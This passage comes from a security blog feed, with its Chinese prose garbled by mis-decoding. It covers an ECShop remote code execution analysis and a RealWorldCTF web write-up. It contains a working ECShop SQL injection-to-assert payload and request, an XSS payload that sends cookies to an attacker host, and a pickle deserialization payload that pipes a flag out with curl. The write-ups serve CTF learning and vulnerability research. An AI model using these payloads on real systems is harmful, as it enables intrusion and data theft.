<p>æ ¹æ®ä»¥ä¸Šåˆ©ç”¨é“¾ï¼Œæœ€åæ„é€ çš„payloadä¸º<code>{$&#39;];assert(xxxxxx);//}</code><br>æœ€åæ‹¼æ¥è¿›evalçš„å‚æ•°é•¿è¿™æ ·ï¼ˆå…¶å®ä¸Šé¢åˆ©ç”¨é“¾ä¸­è¿˜æœ‰å…¶ä»–è®¸å¤šåˆ†æ”¯å¯ä»¥æœ€åæ‹¼æ¥å‡ºå¯æ‰§è¡Œçš„ä»£ç ï¼Œæˆ‘å°±ä¸æ·±å…¥ç ”ç©¶äº†<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;_var[<span class="string">''</span>];assert(base64_decode(<span class="string">"ZmlsZV9wdXRfY29udGVudHMoJy4vdGVtcC94aXNoaXIucGhwJywnPD9waHAgcGhwaW5mbygpOz8+Jyk="</span>));<span class="comment">//']; <span class="meta">?&gt;</span></span></div></pre></td></tr></table></figure></p>
<h2 id="0x03æ¼æ´åˆ©ç”¨"><a href="#0x03æ¼æ´åˆ©ç”¨" class="headerlink" title="0x03æ¼æ´åˆ©ç”¨"></a>0x03æ¼æ´åˆ©ç”¨</h2><p>æœ€åå°±æ˜¯æ„é€ å®Œæ•´çš„payloadäº†ï¼Œæˆ‘çš„æ„é€ è„šæœ¬å¦‚ä¸‹ï¼Œæ‰”åˆ°phpé‡Œè¿è¡Œå°±å¥½<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$payload = <span class="string">"file_put_contents('./temp/xishir.php','&lt;?php phpinfo();?&gt;')"</span>;</div><div class="line">$res = <span class="string">"\&#123;\$'];assert(base64_decode(\""</span>.base64_encode($payload).<span class="string">"\"));//&#125;"</span>;</div><div class="line"></div><div class="line">bin2hex($res);</div><div class="line">$a = [<span class="string">'num'</span> =&gt; <span class="string">"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x"</span>.bin2hex($res).<span class="string">",9"</span>, <span class="string">'id'</span> =&gt; <span class="string">"'/*"</span>];</div><div class="line"></div><div class="line"><span class="keyword">echo</span> serialize($a);</div></pre></td></tr></table></figure></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">GET</span> <span class="string">/ECShop_V2.7.3_UTF8_release1106/upload/user.php</span> HTTP/1.1</div><div class="line"><span class="attribute">Host</span>: 127.0.0.1</div><div class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</div><div class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8</div><div class="line"><span class="attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:273:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x5c7b24275d3b617373657274286261736536345f6465636f646528225a6d6c735a56397764585266593239756447567564484d6f4a793476644756746343393461584e6f61584975634768774a79776e5044397761484167634768776157356d627967704f7a382b4a796b3d2229293b2f2f7d,9";s:2:"id";s:3:"'/*";&#125;</div><div class="line"><span class="attribute">Connection</span>: close</div></pre></td></tr></table></figure>
<p>payloadè¿è¡Œæ•ˆæœ<br><img src="/img/2018-ecshop-rce-5.gif" alt="">  </p>
<h2 id="0x04å‚è€ƒé“¾æ¥"><a href="#0x04å‚è€ƒé“¾æ¥" class="headerlink" title="0x04å‚è€ƒé“¾æ¥"></a>0x04å‚è€ƒé“¾æ¥</h2><ul>
<li><a href="https://xz.aliyun.com/t/2689" target="_blank" rel="noopener">ECShopå…¨ç³»åˆ—ç‰ˆæœ¬è¿œç¨‹ä»£ç æ‰§è¡Œé«˜å±æ¼æ´åˆ†æ</a></li>
<li><a href="www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/">ECShop sqli and rce</a></li>
</ul>
<h2 id="0x05åè¯"><a href="#0x05åè¯" class="headerlink" title="0x05åè¯"></a>0x05åè¯</h2><p>ECShop3.*ä¸­åªæ˜¯åŠ äº†ä¸€äº›é˜²æŠ¤ï¼Œæ ¸å¿ƒæ¼æ´ç‚¹æ¢æ±¤ä¸æ¢è¯ï¼Œæœ‰å…´è¶£çš„å¸ˆå‚…è‡ªè¡Œç ”ç©¶8<br>ECShop4.0çš„ä¿®å¤æ–¹æ¡ˆæ˜¯æŠŠæ’å…¥sqlçš„numå’Œidå¼ºè½¬ä¸ºintï¼Œä½†æ˜¯å‰é¢è¿˜æœ‰ä¸ªåŠ¨æ€å‡½æ•°è°ƒç”¨å’Œååºåˆ—åŒ–è¿˜æ˜¯æœ‰é£é™©çš„æ„Ÿè§‰ï¼Œç­‰ä¸€ä¸ªå¸ˆå‚…æ¥è§£ç­”ã€‚</p>
<p>æœ‰è¶£çš„æ˜¯æ˜¨å¤©åˆ†æä¸‹è½½ä»£ç çš„æ—¶å€™æ³¨å†Œäº†ä¸€ä¸‹ECShopå®˜æ–¹çš„è´¦å·ï¼Œä»Šå¤©å°±æœ‰å°æ”¹æ”¹æ‰“ç”µè¯é—®æˆ‘æ˜¯ä¸æ˜¯æç”µå•†çš„ï¼Œå’Œå¥¹è¯´æˆ‘åªæ˜¯ä¸‹è½½ä»£ç æ¥å­¦ä¹ ç ”ç©¶çš„ï¼Œå¥¹è¿˜æ¨èæˆ‘å»åˆ†ææœ€æ–°çš„4.*ç‰ˆæœ¬ï¼Œå¥½çš„æˆ‘ä¸€å®šåˆ†æï¼Œå’•å’•å’•</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00å‰è¨€&quot;&gt;&lt;/a&gt;0x00å‰è¨€&lt;/h2&gt;&lt;p&gt;å‰å‡ å¤©å‡ºäº†ä¸ª&lt;code&gt;ECShop&amp;lt;= 2.7.x/3.6.x&lt;/code&gt;å‰å°RCEï¼Œå®è®­å¤ªæ— èŠäº†æ¥åˆ†æä¸€æ³¢&lt;br&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="https://www.codemonster.cn/tags/RCE/"/>
    
      <category term="SQL" scheme="https://www.codemonster.cn/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>2018 RWCTF web WriteUp</title>
    <link href="https://www.codemonster.cn/2018/07/31/2018-rwctf-web-writeup/"/>
    <id>https://www.codemonster.cn/2018/07/31/2018-rwctf-web-writeup/</id>
    <published>2018-07-31T05:11:58.000Z</published>
    <updated>2018-07-31T05:19:20.724Z</updated>
    
    <content type="html"><![CDATA[<p>å‘¨æœ«æ‰“äº†é•¿äº­ä¸¾åŠçš„RealWorldCTFï¼Œtqlï¼Œå†™ä¸€ä¸‹webçš„wpç»™åšå®¢é™¤é™¤è‰ã€‚  </p>
<a id="more"></a>
<h1 id="dot-free"><a href="#dot-free" class="headerlink" title="dot free"></a>dot free</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">All the IP addresses and domain names have dots, but can you hack without dot?</div></pre></td></tr></table></figure>
<p>ä¸»é¡µæœ‰ä¸ªæäº¤urlçš„æ¡†ï¼Œå°è¯•æäº¤è‡ªå·±çš„urlï¼Œä½†æ˜¯æ‰“ä¸åˆ°ï¼Œæ€€ç–‘é™åˆ¶äº†ipï¼Œæµ‹è¯•ä¸­å‘ç°ç½‘ç«™æ˜¯æ˜¯djangoï¼Œå¹¶ä¸”å¼€å¯äº†debugæ¨¡å¼ï¼Œæäº¤é”™è¯¯çš„postå‚æ•°å°±å¯ä»¥çœ‹åˆ°æŠ¥é”™ä¿¡æ¯<br><img src="/img/2018-rwctf-img8.png" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°webç«™ç‚¹çš„åå­—å« XSSWebSiteï¼Œäºæ˜¯æ‰¾xssçš„ç‚¹ï¼Œå°è¯•æŸ¥æ‰¾djangoçš„xssï¼Œä½†æ˜¯æœ€æ–°ç‰ˆæœ¬å¹¶æ²¡æœ‰å·²çŸ¥çš„xssæ¼æ´ï¼Œåé¢å‘ç°ä¸»é¡µå­˜åœ¨è¿™æ ·ä¸€æ®µjsä»£ç ï¼Œçœ‹èµ·æ¥æ˜¯ä¸ªdomxss<br><img src="/img/2018-rwctf-img9.png" alt=""></p>
<p>è°ƒè¯•ä¸€ä¸‹ï¼Œå¯ä»¥çŸ¥é“è¿™æ®µä»£ç ä»æµè§ˆå™¨çš„urlå–äº†æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œurldecodeåæ ¼å¼åŒ–ä¸ºjsonï¼Œç„¶åå‘é€åˆ°ä¸€ä¸ªç›‘å¬å™¨é‡Œå»æ“ä½œï¼Œä»£ç é‡Œè¿‡æ»¤äº†valueå‚æ•°ä¸èƒ½å‡ºç°<code>.</code>ï¼Œ<code>//</code>å’Œ<code>ã€‚</code>ï¼Œtypeä¸ä¸ºiframeçš„æ—¶å€™ä¼šå°†valueæ’å…¥åˆ°ä¸€ä¸ªscriptæ ‡ç­¾ä¸­<br>çœ‹åˆ°è¿™é‡Œå’Œé¢˜ç›®æç¤ºå¯¹åº”ä¸Šäº†ï¼Œä¸èƒ½å‡ºç°<code>.</code>ï¼Œæœ€åæ„é€ payloadå¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://13.57.104.34/?&#123;%22iframe%22:&#123;%22value%22:%22http:/\\111111111%22,%22type%22:%22xxxx%22&#125;&#125;</div></pre></td></tr></table></figure></p>
<p>11111111æ›¿æ¢ä¸ºè‡ªå·±çš„vpsçš„ipè½¬10è¿›åˆ¶ï¼Œå¯ä»¥çœ‹åˆ°é¡µé¢é‡Œå·²ç»å‡ºç°ä¸€ä¸ªsrc=11111111çš„scriptæ ‡ç­¾äº†<br><img src="/img/2018-rwctf-img11.png" alt=""></p>
<p>ç„¶åæäº¤è¿™ä¸ªurlåˆ°Recieveï¼ŒæœåŠ¡ç«¯å°±ä¼šæ‰§è¡Œvpsä¸Šæå‰æ„é€ å¥½çš„jsè¯­å¥äº†<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">window</span>.location.href=<span class="string">"http://xxxxxxx/?="</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</div></pre></td></tr></table></figure></p>
<p>æœ€åflagåœ¨cookieé‡Œ<br><img src="/img/2018-rwctf-img10.png" alt=""><br>flag:  rwctf{L00kI5TheFlo9}</p>
<h1 id="bookhub"><a href="#bookhub" class="headerlink" title="bookhub"></a>bookhub</h1><p>é¢˜ç›®æç¤ºwww.zipï¼Œå¯ä»¥ä¸‹è½½åˆ°æºç <br>çœ‹åˆ°ä»£ç é‡Œç™»é™†çš„æ—¶å€™ä¼šæ£€æŸ¥ipç™½åå•ï¼Œè¿™é‡Œçš„ipæ˜¯å–çš„xffï¼Œä¸åœ¨ç™½åå•å†…ä¼šæç¤ºipä¸åœ¨ç™½åå•å†…<br><img src="/img/2018-rwctf-img12.png" alt=""><br>ä¿®æ”¹xffä¸ºç™½åå•ipå¤±è´¥ï¼ŒçŒœæµ‹xffè·å–åˆ°çš„æ˜¯nginxè½¬å‘è¿‡å»çš„ipï¼Œæ‰€ä»¥æƒ³åˆ°ä»ä¸Šé¢è¿™ä¸²é‡Œçš„å”¯ä¸€ä¸€ä¸ªå¤–ç½‘ip 18.213.16.123å…¥æ‰‹<br>æ‰«æè¯¥ipï¼Œå‘ç°5000ç«¯å£ä¹Ÿå¼€äº†ä¸€ä¸ªç›¸åŒçš„åº”ç”¨ç¨‹åºbookhubï¼Œå¹¶ä¸”å¼€å¯äº†debugæ¨¡å¼ï¼Œåœ¨è¿™é‡Œç™»é™†çš„æç¤ºæ˜¯å¯†ç é”™è¯¯ï¼Œè¯´æ˜å·²ç»ç»•è¿‡äº†ç™½åå•æ£€æŸ¥ã€‚</p>
<p>å®¡è®¡ä»£ç å‘ç°æœ‰ä¸€å¤„é‰´æƒçš„è£…é¥°å™¨ä½¿ç”¨é”™è¯¯(routeå’Œlogin_requiredé¡ºåºåäº†)<br><img src="/img/2018-rwctf-img4.png" alt=""><br>è¿™ä¼šå¯¼è‡´é‰´æƒè£…é¥°å™¨æ— æ•ˆï¼Œæ²¡æœ‰ç™»é™†çš„ç”¨æˆ·ä¹Ÿèƒ½è°ƒç”¨è¯¥æ¥å£ï¼ˆdebugæ¨¡å¼ä¸‹<br>æŸ¥çœ‹æ¥å£ä»£ç ï¼Œå¯ä»¥çŸ¥é“è¿™ä¸ªæ¥å£evaläº†luaè„šæœ¬ï¼Œç”¨æ¥æ¸…é™¤é™¤äº†è‡ªå·±ä¹‹å¤–å…¶ä»–æ‰€æœ‰äººçš„sessionï¼Œå…¶ä¸­sessionidå­˜åœ¨æ‹¼æ¥æ“ä½œï¼Œå¹¶ä¸”å¯æ§ï¼Œæƒ³åˆ°å¯ä»¥æ³¨å…¥ç‚¹ä¸œè¥¿<br><img src="/img/2018-rwctf-img5.png" alt=""><br>å‚è€ƒ <a href="https://www.ctolib.com/topics-129777.html" target="_blank" rel="noopener">https://www.ctolib.com/topics-129777.html</a><br>é€šè¿‡è¿™ä¸ªæ¥å£ï¼Œå°†æ¶æ„çš„æ•°æ®ï¼ˆcPickleååºåˆ—åŒ–æ¼æ´çš„payloadï¼‰æ³¨å…¥åˆ°redisä¸­ï¼Œå½“é‰´æƒçš„æ—¶å€™å°±ä¼šååºåˆ—åŒ–è¯¥å­—ç¬¦ä¸²ï¼Œå°±èƒ½ä»»æ„å‘½ä»¤æ‰§è¡Œäº†ï¼Œä½†æ˜¯å› ä¸ºè¯¥æ¥å£éœ€è¦csrf_tokenæ ¡éªŒï¼Œæ‰€ä»¥å¤šä¸€æ­¥è·å–tokençš„æ“ä½œ<br>å…·ä½“æ“ä½œå¦‚ä¸‹ï¼š<br>1.ç”Ÿæˆpayloadï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> cPickle</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">genpoc</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></div><div class="line">        s = <span class="string">"""curl http://xxxx.ceye.io/`/readflag|base64`"""</span></div><div class="line">        <span class="keyword">return</span> os.system, (s,)</div><div class="line"></div><div class="line">evil = cPickle.dumps(genpoc())</div><div class="line"><span class="keyword">print</span> evil.replace(<span class="string">"\n"</span>,<span class="string">"\\n"</span>)</div></pre></td></tr></table></figure></p>
<p>2.æ„é€ æ¶æ„çš„sessionidå¹¶è®¿é—®/login/è·å–csrf_tokenï¼š<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bookhub-session=aaa<span class="string">"&#125; redis.call("</span>set<span class="string">","</span>bookhub:session:aaa<span class="string">","</span>cposix\nsystem\np1\n(S<span class="string">'curl http://xxxxxxx.ceye.io/`/readflag|base64`'</span>\np2\ntRp3\n.<span class="string">")--;</span></div></pre></td></tr></table></figure></p>
<p>è¿™é‡Œæ‹¼æ¥è¿›luaè„šæœ¬åé•¿è¿™æ ·ï¼š<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">local</span> inputs = &#123;<span class="string">"bookhub:session:aaa"</span>&#125;</div><div class="line">redis.call(<span class="string">"set"</span>,<span class="string">"bookhub:session:aaa"</span>,<span class="string">"cposix\nsystem\np1\n(S'curl http://xxxxxxx.ceye.io/`/readflag|base64`'\np2\ntRp3\n."</span>)<span class="comment">--;</span></div></pre></td></tr></table></figure></p>
<p>åˆ°æ—¶å€™è„šæœ¬è¿è¡Œåå°±ä¼šå°†æ¶æ„æ•°æ®å†™å…¥<code>aaa</code>è¿™ä¸ªsession-idçš„valueé‡Œï¼Œå¹¶ä¸”åˆ é™¤å…¶ä»–é™¤äº†aaaæ„å¤–çš„session<br><img src="/img/2018-rwctf-img6.png" alt=""><br>3.å¸¦ç€2ä¸­ç”Ÿæˆçš„ssrf_tokenå’Œæ¶æ„çš„session-idå»è¯·æ±‚ /admin/system/refresh_session<br>postdataï¼š submit=1&amp;ssrf_token=<br>å¯¼è‡´luaä»£ç æ³¨å…¥ä¿®æ”¹æˆ‘ä»¬çš„ç›®æ ‡session-idçš„valueå€¼, æœ€åç”¨<code>aaa</code>è¿™ä¸ªsession-idä»»æ„è®¿é—®ä¸€ä¸ªéœ€è¦sessionçš„é¡µé¢å³å¯è§¦å‘ååºåˆ—åŒ–æ¼æ´æ‰§è¡Œå‘½ä»¤<br>æœ€åç”¨ceyeå¤–å¸¦å‡ºflag<br><img src="/img/2018-rwctf-img13.png" alt=""></p>
<h1 id="Print-MD"><a href="#Print-MD" class="headerlink" title="Print-MD"></a>Print-MD</h1><p>Print-MDè¿™é“é¢˜æ¯”èµ›è¿‡ç¨‹ä¸­æ²¡åšå‡ºæ¥ï¼Œæ¯”èµ›ç»“æŸå¿™ç€ä¸Šç­ï¼Œwpè¿˜æ²¡å†™å®Œï¼Œå…ˆå†™ä¸€ä¸‹æ€è·¯<br>æƒ³çœ‹wpçš„å¯ä»¥å»è“çŒ«å¸ˆå‚…çš„åšå®¢è†œä¸€ä¸‹ <a href="https://blog.cal1.cn/post/RealWorldCTF%20PrintMD%20writeup" target="_blank" rel="noopener">RealWorldCTF PrintMD writeup</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">PrintMD</div><div class="line">Paste your HackMD link to get a printer-friendly version!</div><div class="line">The note should neither be Protected nor Private.</div><div class="line">Press Ctrl + P to print or save as PDF.</div><div class="line">PrintMD is compatible with outdated browsers.</div><div class="line">If the link is published version of the note, which contains /s/, you can append /edit to get the original link. e.g., https://hackmd.io/s/HyCFXNkNm/edit</div><div class="line">â€flag is in /flag</div></pre></td></tr></table></figure></p>
<p><code>print?url=</code>å¯ä»¥æäº¤ä¸€ä¸ªhackmdçš„é“¾æ¥å¹¶å°†mdæ–‡æ¡£è§£æä¸ºhtmlï¼Œä½†æ˜¯é™åˆ¶äº†åªèƒ½è¯»å–<code>https://hackmd.io/</code>å¼€å¤´çš„urlï¼Œæ•…æ— æ³•ssrf  </p>
<p>ç¬¬ä¸€ä¸ªhintæç¤º å…¼å®¹ä½ç‰ˆæœ¬æµè§ˆå™¨ï¼Œå…¶å®ä¹‹å‰å°±æœ‰å‘ç°åœ¨æˆ‘æœ¬æœº<code>ä¸åŒæµè§ˆå™¨</code>è®¿é—®printæ¥å£ä¼šæœ‰ä¸åŒçš„æ•ˆæœï¼š</p>
<ol>
<li>chromeè¯·æ±‚è¯¥æ¥å£ï¼Œè¿”å›çš„æ ‡é¢˜æ˜¯ <code>è¯·ç¨å</code>ï¼Œç„¶åæµè§ˆå™¨å†å¾€å¤–å‘è¯·æ±‚è·å–hackmdçš„mdå†…å®¹ï¼Œç„¶åè§£ææˆhtmlå±•ç¤ºåˆ°é¡µé¢ä¸Š  </li>
<li>firefoxè¯·æ±‚æ¥å£ï¼Œè¿”å›çš„æ˜¯å·²ç»è§£æå¥½çš„htmlæ ‡ç­¾ï¼Œå¾ˆæ˜æ˜¾åç«¯åšäº†è¯·æ±‚å¹¶è§£æmdä¸ºhtmlçš„å·¥ä½œ</li>
</ol>
<p>çŒœæµ‹printæ¥å£åº”è¯¥æ˜¯æ ¡éªŒäº†user-agentï¼Œäºæ˜¯æµ‹è¯•äº†ä¸€ä¸‹chromeçš„uaï¼Œå‘ç°66.0æ˜¯ä¸ªåˆ†æ°´å²­ï¼Œç„¶è€Œå¹¶æ²¡æœ‰å•¥è¿›å±•<br><img src="/img/2018-rwctf-img1.png" alt=""><br><img src="/img/2018-rwctf-img2.png" alt=""></p>
<p>åé¢æŸ¥çœ‹å‰ç«¯ä»£ç é‡Œçš„ print.ba84889093b992d33112.js<br>å‘ç°è¿™æ ·ä¸€æ®µä»£ç <br><img src="/img/2018-rwctf-img3.png" alt=""><br>å¯ä»¥çœ‹åˆ°è¿™ä¸ªåº”è¯¥å°±æ˜¯printæ¥å£çš„æ ¸å¿ƒä»£ç äº†ï¼Œæ¥å—åˆ°urlå‚æ•°ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºhackmdçš„urlï¼Œç„¶ååœ¨urlæœ€åå¦‚æœä¸æ˜¯/downloadå°±æ‹¼æ¥ä¸€ä¸ª/downloadè¿›å»ï¼Œ<br>å› ä¸ºhackmd.io/xxxxxxx/download æ˜¯å¯ä»¥ä¸‹è½½markdownæ ¼å¼çš„æ–‡ä»¶çš„ï¼Œ<br>ç„¶åå°†uaå’Œurlä¼ å…¥ <code>/api/render/</code> æ¥å£ï¼Œå› ä¸ºè¿™ä¸ªæ¥å£å¤–éƒ¨æ²¡æœ‰æƒé™è®¿é—®ï¼ˆè®¿é—®ä¼š403ï¼‰ï¼Œè€Œä¸”ä¸çŸ¥é“è¿™ä¸ªæ¥å£è°ƒç”¨äº†å•¥åº“ï¼Œæ‰€ä»¥é™·å…¥äº†åƒµå±€</p>
<p>hint2 ç»™äº†render.jsçš„ä»£ç <br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> &#123;Router&#125; = <span class="built_in">require</span>(<span class="string">'express'</span>)</div><div class="line"><span class="keyword">const</span> &#123;matchesUA&#125; = <span class="built_in">require</span>(<span class="string">'browserslist-useragent'</span>)</div><div class="line"><span class="keyword">const</span> router = Router()</div><div class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">'axios'</span>)</div><div class="line"><span class="keyword">const</span> md = <span class="built_in">require</span>(<span class="string">'../../plugins/md_srv'</span>)</div><div class="line"></div><div class="line">router.post(<span class="string">'/render'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</div><div class="line">  <span class="keyword">let</span> ret = &#123;&#125;</div><div class="line">  ret.ssr = !matchesUA(req.body.ua, &#123;</div><div class="line">    browsers: [<span class="string">"last 1 version"</span>, <span class="string">"&gt; 1%"</span>, <span class="string">"IE 10"</span>],</div><div class="line">    _allowHigherVersions: <span class="literal">true</span></div><div class="line">  &#125;);</div><div class="line">  <span class="keyword">if</span> (ret.ssr) &#123;</div><div class="line">    axios(req.body.url).then(<span class="function"><span class="params">r</span> =&gt;</span> &#123;</div><div class="line">          ret.mdbody = md.render(r.data)</div><div class="line">      res.json(ret)</div><div class="line">    &#125;)</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> &#123;</div><div class="line">    ret.mdbody = md.render(<span class="string">'# è¯·ç¨å€™â€¦'</span>)</div><div class="line">    res.json(ret)</div><div class="line">  &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = router</div></pre></td></tr></table></figure></p>
<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯æ§çš„åœ°æ–¹æœ‰ä¸‰ä¸ªç‚¹ï¼Œåˆ†åˆ«å¯¹åº”ä¸‰ä¸ªåº“ï¼š</p>
<ol>
<li>ua: å¯¹åº”<code>browserslist-useragent</code>åº“ï¼Œä¸»è¦æ˜¯ç”¨æ¥åˆ¤æ–­å½“å‰uaç‰ˆæœ¬æ˜¯å¦ç¬¦åˆé¢„æœŸç‰ˆæœ¬ï¼Œæ„Ÿè§‰é—®é¢˜ä¸å¤§</li>
<li>url: å¯¹åº”<code>axios</code>åº“ï¼Œå½“uaç‰ˆæœ¬è¢«åˆ¤å®šä¸ºä½ç‰ˆæœ¬æ—¶ï¼Œä¼šç”¨axioså¯¹urlå‘é€ä¸€ä¸ªgetè¯·æ±‚ï¼Œä½†æ˜¯urlé™åˆ¶æ­»äº†åªèƒ½ <code>https://hackmd.io/</code>ï¼Œæ‰€ä»¥èƒ½åˆ©ç”¨çš„åœ°æ–¹æœ‰é™</li>
<li>r.data: urlè¿”å›çš„å†…å®¹ï¼Œç„¶åç”¨<code>../../plugins/md_srv</code>è¿™ä¸ªåº“è¿›è¡Œäº†è§£æï¼Œä¸çŸ¥é“è¿™ä¸ªåº“æ˜¯å•¥æƒ…å†µ</li>
</ol>
<p>æ¯”èµ›è¿‡ç¨‹ä¸­åˆ°è¿™é‡Œåˆé™·å…¥äº†åƒµå±€ï¼Œèµ›åé—®äº†è“çŒ«å¸ˆå‚…æ‰çŸ¥é“åˆ©ç”¨ç‚¹åœ¨axiosè¿™è¾¹</p>
<p>æœªå®Œå¾…ç»­ã€‚ã€‚ã€‚</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å‘¨æœ«æ‰“äº†é•¿äº­ä¸¾åŠçš„RealWorldCTFï¼Œtqlï¼Œå†™ä¸€ä¸‹webçš„wpç»™åšå®¢é™¤é™¤è‰ã€‚  &lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="WEB" scheme="https://www.codemonster.cn/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>2018 ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›ç¬¬ä¸ƒ(ç¦å»º)èµ›åŒº WriteUp</title>
    <link href="https://www.codemonster.cn/2018/05/17/2018-t3sec-fujian-writeup/"/>
    <id>https://www.codemonster.cn/2018/05/17/2018-t3sec-fujian-writeup/</id>
    <published>2018-05-17T06:42:59.000Z</published>
    <updated>2018-07-28T06:19:57.184Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ—¶éš”ä¸€å¹´å†æ¬¡å‚åŠ é“ä¸‰ï¼Œä»Šå¹´çš„èµ›åˆ¶æœ‰ç‚¹æ”¹åŠ¨ï¼Œä¼ä¸šèµ›ä¸ªäººèµ›å’Œæ•°æ®èµ›ä¸‰åœºåœ¨åŒä¸€å¤©è¿›è¡Œï¼Œåœ¨é˜Ÿå‹ä»¬çš„å¸¦é¢†ä¸‹æ··äº†ä¸ªèµ›åŒºç¬¬äºŒåï¼ŒæˆåŠŸæ™‹çº§å†³èµ›ã€‚æœ¬æ¬¡æ¯”èµ›ä¸­æˆ‘ä¸»è¦è´Ÿè´£çš„æ˜¯ä¼ä¸šèµ›éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯å¯¹ç»™å®šç›®æ ‡è¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œç„¶åä¸­é—´ç©¿æ’ç€åšäº†å‡ é“æ•°æ®èµ›çš„é¢˜ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚ï¼ˆå› ä¸ºæ¯”èµ›è¿‡ç¨‹ä¸­æ²¡æ€ä¹ˆæˆªå›¾ï¼Œå¸ˆå‚…ä»¬åˆ«æ‰“æˆ‘ï¼‰</p>
<a id="more"></a>
<h2 id="0x00-ä¼ä¸šèµ›ï¼Œå¯åŠ¨"><a href="#0x00-ä¼ä¸šèµ›ï¼Œå¯åŠ¨" class="headerlink" title="0x00 ä¼ä¸šèµ›ï¼Œå¯åŠ¨"></a>0x00 ä¼ä¸šèµ›ï¼Œå¯åŠ¨</h2><p>æ¯”èµ›å¼€å§‹ï¼Œä»å¹³å°é‡Œå¯ä»¥çœ‹åˆ°ç»™äº†ä¸¤ä¸ªip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">202.1.2.50</div><div class="line">202.1.2.60</div></pre></td></tr></table></figure></p>
